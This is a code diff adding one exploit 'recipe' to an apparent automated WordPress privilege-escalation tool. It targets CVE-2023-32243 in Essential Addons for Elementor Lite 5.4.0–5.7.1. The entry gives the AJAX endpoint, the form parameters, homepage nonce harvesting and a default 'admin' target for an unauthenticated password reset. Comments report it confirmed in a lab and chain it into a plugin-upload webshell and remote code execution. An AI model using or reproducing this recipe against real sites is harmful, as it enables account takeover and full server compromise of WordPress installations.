@@ -303,6 +303,45 @@ PRIVESC_RECIPES = [
                 "registration (CWE-269) → unauth attacker-chosen role, "
                 "including administrator.",
     },
+    {
+        "plugin": "essential-addons-for-elementor-lite",
+        "cve": "CVE-2023-32243",
+        "affected": ">=5.4.0,<=5.7.1",
+        "kind": "password-reset",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "target_user": "admin",
+        "user_param": "rp_login",
+        "pass_param": "eael-pass1",
+        "pass_confirm_param": "eael-pass2",
+        # Static form fields the reset dispatcher requires. `action` +
+        # eael-resetpassword-submit route init→reset_password(); page_id/widget_id
+        # need only be non-empty (used for cosmetic error strings via
+        # lr_get_widget_settings, NOT a gate — so no real login/register widget
+        # page is required, unlike Kirki CVE-2026-8206).
+        "params": {
+            "action": "login_or_register_user",
+            "eael-resetpassword-submit": "1",
+            "page_id": "124",
+            "widget_id": "224",
+        },
+        # The nonce is verified against action 'essential-addons-elementor' and is
+        # printed on the homepage by Asset_Builder as `var localize = {..."nonce":
+        # "..."}` whenever EA is active — harvest key "nonce" off "/".
+        "nonce_from": {"url": "/", "key": "nonce", "param": "eael-resetpassword-nonce"},
+        "source": "registry",
+        # SOURCE+LIVE CONFIRMED (2026-07-18, cve-essaddons lab, EA 5.7.1 → admin
+        # password reset, hash changed, new pass validated). login_or_register_user()
+        # is hooked on plain `init` (Bootstrap.php), so it fires unauth on ANY front
+        # URL incl. admin-ajax.php. reset_password() takes rp_login, calls
+        # get_user_by('login', rp_login) then reset_password($user, $_POST['eael-pass1'])
+        # with ZERO rp_key validation → any user's password is ours. Feeds Track B:
+        # returned admin creds → authshell login → plugin-upload webshell → confirmed RCE.
+        "note": "Unauth arbitrary password reset (CVE-2023-32243). reset_password() "
+                "never validates the reset key — it sets rp_login's password to our "
+                "eael-pass1 behind only a homepage-harvestable nonce. Yields admin "
+                "creds (default target 'admin') → Track-B authshell → shell. "
+                "Gated to EA lite 5.4.0-5.7.1 (fixed 5.7.2).",
+    },
 ]
 
 
